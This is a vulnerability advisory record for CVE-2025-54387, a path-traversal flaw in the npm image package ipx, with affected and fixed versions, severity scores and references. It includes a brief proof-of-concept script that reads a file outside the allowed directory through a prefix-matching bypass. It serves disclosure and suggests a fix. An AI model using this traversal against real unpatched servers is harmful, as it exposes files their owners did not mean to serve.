advisory_id: GHSA-mm3p-j368-7jcr
datasource_id: github_osv_importer_v2/GHSA-mm3p-j368-7jcr
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-mm3p-j368-7jcr/GHSA-mm3p-j368-7jcr.json
aliases:
  - CVE-2025-54387
summary: "IPX Allows Path Traversal via Prefix Matching Bypass\n### Summary\n\nThe approach\
  \ used to check whether a path is within allowed directories is vulnerable to path prefix\
  \ bypass when the allowed directories do not end with a path separator. This occurs because\
  \ the check relies on a raw string prefix comparison.\n\n\n### PoC\n\n- setup\n```\nmkdir\
  \ ~/public123\nmove a png file under ~/public123 with name test.png\ncd\nnpm i ipx \n```\n\
  \n- `main.js`\n```js\nimport { createIPX, ipxFSStorage } from \"ipx\";\n\nconst ipx = createIPX({\n\
  \  storage: ipxFSStorage({ dir: \"./public\" }),\n});\n\n\n(async () => { \n    {\n      \
  \  const source = await ipx(\"../public123/test.png\"); // access file outside ./public dir\
  \ because of same prefix folder\n        const { data, format } = await source.process();\n\
  \        console.log(format) // print image data\n    }\n    {\n        try {\n          \
  \  const source = await ipx(\"../publi123/test.png\"); // forbidden path: the prefix is not\
  \ the same\n            const { data, format } = await source.process();\n            console.log(data)\n\
  \        } catch (err) {\n            console.log(err.message) // Forbidden path:\n      \
  \  }\n\n    }\n\n})()\n```\n\n- `node main.js`\n```\npng\nForbidden path: /../publi123/test.png\n\
  ```\n\n### Impact\nPath Traversal\n\n### Possible Fix\n\nCheck if the `dir` ends with `/`\
  \ (path separator) and if not, add before calling `startsWith`"
impacted_packages:
  - purl: pkg:npm/ipx
    affected_versions: vers:npm/<1.3.2
    fixed_versions: vers:npm/1.3.2
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/ipx
    affected_versions: vers:npm/>=2.0.0-0|<2.1.1
    fixed_versions: vers:npm/2.1.1
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/ipx
    affected_versions: vers:npm/>=3.0.0|<3.1.1
    fixed_versions: vers:npm/3.1.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '6.9'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:H/SI:L/SA:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-mm3p-j368-7jcr/GHSA-mm3p-j368-7jcr.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-22
references:
  - url: https://github.com/unjs/ipx
    reference_type:
    reference_id:
  - url: https://github.com/unjs/ipx/commit/81693ddbfc062cc922e4e2406e8427ab4e3ad214
    reference_type:
    reference_id:
  - url: https://github.com/unjs/ipx/releases/tag/v1.3.2
    reference_type:
    reference_id:
  - url: https://github.com/unjs/ipx/releases/tag/v2.1.1
    reference_type:
    reference_id:
  - url: https://github.com/unjs/ipx/releases/tag/v3.1.1
    reference_type:
    reference_id:
  - url: https://github.com/unjs/ipx/security/advisories/GHSA-mm3p-j368-7jcr
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-54387
    reference_type:
    reference_id: CVE-2025-54387
